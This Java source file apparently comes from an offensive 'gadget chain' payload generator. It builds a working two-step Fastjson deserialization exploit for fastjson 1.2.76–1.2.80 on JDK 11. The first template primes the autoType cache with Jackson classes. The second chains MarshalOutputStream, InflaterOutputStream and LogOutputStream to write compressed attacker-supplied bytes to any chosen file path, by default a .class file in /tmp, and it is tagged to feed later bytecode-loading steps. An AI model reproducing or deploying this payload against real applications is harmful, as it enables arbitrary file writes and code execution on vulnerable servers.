package com.ar3h.plugin.fr.gadget.impl.fastjson;

import com.ar3h.chains.common.Gadget;
import com.ar3h.chains.common.GadgetChain;
import com.ar3h.chains.common.GadgetContext;
import com.ar3h.chains.common.annotations.GadgetAnnotation;
import com.ar3h.chains.common.annotations.GadgetTags;
import com.ar3h.chains.common.param.Param;
import com.fasterxml.jackson.databind.ObjectMapper;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.zip.Deflater;

@GadgetTags(
        tags = {"FastjsonPayload", "END"},
        nextTags = {"BytecodeDocbaseTag", "FileSteamConvertTag"}
)
@GadgetAnnotation(
        name = "FastjsonWriteFileJDK11 1.2.80",
        description = "缓存 OutputSteam 通过 sun.rmi.log.LogOutputStream写文件",
        dependencies = {"JDK11", "1.2.75 < fastjson <= 1.2.80"}
)
public class FastjsonWriteFileJDK11_1_2_80 implements Gadget {
    @Param(
            name = "文件写的目的路径"
    )
    public String DestPath = "/tmp/test.class";
    public static String template1 = "{\n" +
            "  \"a\": \"{\\\"@type\\\":\\\"java.lang.Exception\\\",\\\"@type\\\":\\\"com.fasterxml.jackson.core.JsonGenerationException\\\",\\\"g\\\":{}}\",\n" +
            "  \"b\": {\n" +
            "    \"$ref\": \"$.a.a\"\n" +
            "  },\n" +
            "  \"c\": \"{\\\"@type\\\":\\\"com.fasterxml.jackson.core.JsonGenerator\\\",\\\"@type\\\":\\\"com.fasterxml.jackson.core.json.UTF8JsonGenerator\\\",\\\"out\\\":{}}\",\n" +
            "  \"d\": {\n" +
            "    \"$ref\": \"$.c.c\"\n" +
            "  }\n" +
            "}";

    public static String template2 = "{\n" +
            "    \"@type\":\"java.lang.AutoCloseable\",\n" +
            "    \"@type\":\"sun.rmi.server.MarshalOutputStream\",\n" +
            "    \"out\":\n" +
            "    {\n" +
            "        \"@type\":\"java.util.zip.InflaterOutputStream\",\n" +
            "        \"out\":\n" +
            "        {\n" +
            "           \"@type\":\"sun.rmi.log.LogOutputStream\",\n" +
            "           \"raf\": {\n" +
            "              \"file\": \"%s\",\n" +
            "              \"mode\": \"rwd\"\n" +
            "           }\n" +
            "        },\n" +
            "        \"infl\":\n" +
            "        {\n" +
            "            \"input\":%s\n" +
            "        },\n" +
            "        \"bufLen\":1048576\n" +
            "    },\n" +
            "    \"protocolVersion\":1\n" +
            "}";

    public FastjsonWriteFileJDK11_1_2_80() {
    }

    public Object getPayload(byte[] bytes) throws IOException {
        String gzcompress = gzcompress(bytes);
        Map<String, Object> map = new LinkedHashMap();
        map.put("array", gzcompress);
        map.put("limit", Base64.getDecoder().decode(gzcompress).length);
        ObjectMapper mapper = new ObjectMapper();
        String payload = mapper.writerWithDefaultPrettyPrinter().writeValueAsString(map);
        return this.getPayload(this.DestPath, payload);
    }

    public String getPayload(String target, Object file) throws IOException {
        return "[INFO] Step1:\n" + template1 + "\n\n[INFO] Step2:\n" + String.format(template2, target, file);
    }

    public Object invoke(GadgetContext context, GadgetChain chain) throws Exception {
        return this.getPayload((byte[])chain.doCreate(context));
    }

    public static String gzcompress(byte[] data) {
        byte[] output = new byte[0];
        Deflater compresser = new Deflater();
        compresser.reset();
        compresser.setInput(data);
        compresser.finish();
        ByteArrayOutputStream bos = new ByteArrayOutputStream(data.length);

        try {
            byte[] buf = new byte[1024];

            while(!compresser.finished()) {
                int i = compresser.deflate(buf);
                bos.write(buf, 0, i);
            }

            output = bos.toByteArray();
        } catch (Exception e) {
            output = data;
            e.printStackTrace();
        } finally {
            try {
                bos.close();
            } catch (IOException e) {
                e.printStackTrace();
            }

        }

        compresser.end();
        return Base64.getEncoder().encodeToString(output);
    }
}
